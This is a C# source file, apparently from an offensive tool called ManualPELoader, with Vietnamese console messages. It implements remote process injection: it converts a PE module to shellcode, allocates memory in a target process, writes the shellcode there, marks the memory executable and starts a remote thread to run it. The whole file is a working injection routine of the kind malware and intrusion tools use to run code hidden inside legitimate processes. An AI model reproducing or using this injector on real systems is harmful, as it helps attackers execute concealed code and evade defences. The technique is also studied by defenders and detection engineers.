using ManualPELoader.Interop;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace ManualPELoader.Library
{
    using NTSTATUS = Int32;
    using SIZE_T = UIntPtr;
    internal class Modules
    {
        public static bool InjectShellcode(int pid, byte[] moduleBytes)
        {
            NTSTATUS ntstatus;
            int error;
            byte[] shellcode;
            IntPtr pShellcode;
            IntPtr pProtectBase;
            uint nNumberOfBytes;
            string processName;
            string addressFormat;
            if (Environment.Is64BitProcess) // Xác định định định dạng địa chỉ dựa trên kiến trúc của tiến trình hiện tại
            {
                addressFormat = "X16";
            }
            else
            {
                addressFormat = "X8";
            }
            IMAGE_FILE_MACHINE machine = Helpers.GetPeArchitecture(moduleBytes);
            var hProcess = IntPtr.Zero;
            var status = false;
            try
            {
                processName = Process.GetProcessById(pid).ProcessName;
            }
            catch
            {
                Console.WriteLine("[-] Không tìm thấy tiến trình với PID đã cho!");
                return false;
            }

            if(!Helpers.IsValidPe(moduleBytes))
            {
                Console.WriteLine("[-] Tệp module không hợp lệ hoặc không phải là tệp PE!");
                return false;
            }
            else
            {
                if(Environment.Is64BitProcess && (machine == IMAGE_FILE_MACHINE.I386))
                {
                    Console.WriteLine("[-] Không thể tiêm module 32-bit vào tiến trình 64-bit!");
                    return false;
                }
                else if(!Environment.Is64BitProcess && (machine == IMAGE_FILE_MACHINE.AMD64))
                {
                    Console.WriteLine("[-] Không thể tiêm module 64-bit vào tiến trình 32-bit!");
                    return false;
                }
                else if(!(machine == IMAGE_FILE_MACHINE.I386) && !(machine == IMAGE_FILE_MACHINE.AMD64))
                {
                    Console.WriteLine("[-] Kiến trúc module không được hỗ trợ!");
                    return false;
                }
                else
                {
                    Console.WriteLine("[+] Tiến hành đổi dữ liệu module thành shellcode");
                }
                shellcode = Utilities.ConvertToShellcode(moduleBytes);
                Console.WriteLine("[+] Kích thước shellcode: {0} bytes", shellcode.Length);
                Console.WriteLine("[*] Tiến hành mở tiến trình {0} (PID: {1})", processName, pid);
                hProcess = NativeMethods.OpenProcess(
                    ACCESS_MASK.PROCESS_CREATE_THREAD | ACCESS_MASK.PROCESS_QUERY_INFORMATION | ACCESS_MASK.PROCESS_VM_OPERATION | ACCESS_MASK.PROCESS_VM_WRITE,
                    false,
                    pid);
                if(hProcess == IntPtr.Zero)
                {
                    error = Marshal.GetLastWin32Error();
                    Console.WriteLine("[-] Mở tiến trình {0} (PID: {1}) thất bại! Lỗi: {2}", processName, pid, error);
                    return false;
                }
                else
                {
                    Console.WriteLine("[+] Đã lấy được handle");
                    Console.WriteLine("    [*] Process Handle : 0x{0}", hProcess.ToString("X"));
                    if (Environment.Is64BitOperatingSystem)
                    {
                        NativeMethods.IsWow64Process(hProcess, out bool isWow64);
                        if(!isWow64 && !Environment.Is64BitProcess)
                        {
                            Console.WriteLine("[-] Không thể tiêm mã 64-bit từ tiến trình 32-bit!");
                            return false;
                        }
                        else if(isWow64 && Environment.Is64BitProcess) 
                        {
                            Console.WriteLine("[-] Không thể tiêm mã 32-bit từ tiến trình 64-bit!");
                            return false;
                        }
                    }
                    Console.WriteLine("[*] Tiến hành cấp phát bộ nhớ trong tiến trình đích");
                    pShellcode = NativeMethods.VirtualAllocEx(
                        hProcess,
                        IntPtr.Zero,
                        new SIZE_T((uint)shellcode.Length),
                        ALLOCATION_TYPE.COMMIT | ALLOCATION_TYPE.RESERVE,
                        MEMORY_PROTECTION.READWRITE);
                    if(pShellcode == IntPtr.Zero)
                    {
                        error = Marshal.GetLastWin32Error();
                        Console.WriteLine("[-] Cấp phát bộ nhớ thất bại! Lỗi: {0}", error);
                        return false;
                    }
                    else
                    {
                        Console.WriteLine("[+] Đã cấp phát bộ nhớ thành công tại 0x{0}", pShellcode.ToString(addressFormat));
                    }

                    ntstatus = NativeMethods.NtWriteVirtualMemory(
                        hProcess,
                        pShellcode,
                        shellcode,
                        (uint)shellcode.Length,
                        out uint bytesWritten);

                    if (ntstatus != Win32Consts.STATUS_SUCCESS)
                    {
                        Console.WriteLine("[-] Viết shellcode vào tiến trình thất bại! NTSTATUS: 0x{0:X8}", ntstatus);
                        return false;
                    }
                    else
                    {
                        Console.WriteLine("[+] Đã viết {0} bytes shellcode vào tiến trình tại địa chỉ 0x{1}", bytesWritten, pShellcode.ToString(addressFormat));
                    }

                    pProtectBase = pShellcode;
                    nNumberOfBytes = (uint)shellcode.Length;

                    Console.WriteLine("[*] Thay đổi quyền truy cập bộ nhớ để thực thi shellcode");
                    ntstatus = NativeMethods.NtProtectVirtualMemory(
                        hProcess,
                        ref pProtectBase,
                        ref nNumberOfBytes,
                        MEMORY_PROTECTION.EXECUTE_READ,
                        out MEMORY_PROTECTION oldProtect);

                    status = (ntstatus == Win32Consts.STATUS_SUCCESS);
                    if (!status)
                    {
                        Console.WriteLine("[-] Thay đổi quyền truy cập bộ nhớ thất bại! NTSTATUS: 0x{0:X8}", ntstatus);
                        return false;
                    }
                    else
                    {
                        Console.WriteLine("[+] Đã thay đổi quyền truy cập bộ nhớ thành EXECUTE_READ");
                    }
                    Console.WriteLine("[*] Tạo luồng để thực thi shellcode trong tiến trình đích");
                    ntstatus = NativeMethods.NtCreateThreadEx(
                        out IntPtr hThread,
                        ACCESS_MASK.THREAD_ALL_ACCESS,
                        IntPtr.Zero,
                        hProcess,
                        pShellcode,
                        IntPtr.Zero,
                        false,
                        0,
                        0,
                        0,
                        IntPtr.Zero);
                    status = (ntstatus == Win32Consts.STATUS_SUCCESS);
                    if (!status)
                    {
                        Console.WriteLine("[-] Tạo luồng thất bại! NTSTATUS: 0x{0:X8}", ntstatus);
                        return false;
                    }
                    else
                    {
                        Console.WriteLine("[+] Đã tạo luồng thành công");
                        Console.WriteLine("    [*] Thread Handle : 0x{0}", hThread.ToString("X"));
                    }
                    NativeMethods.NtClose(hThread);
                    if(hProcess != IntPtr.Zero)
                    {
                        NativeMethods.NtClose(hProcess);
                    }
                    Console.WriteLine("[+] Tiêm shellcode thành công vào tiến trình {0} (PID: {1})", processName, pid);
                    return true;
                }
            }
        }
    }
}
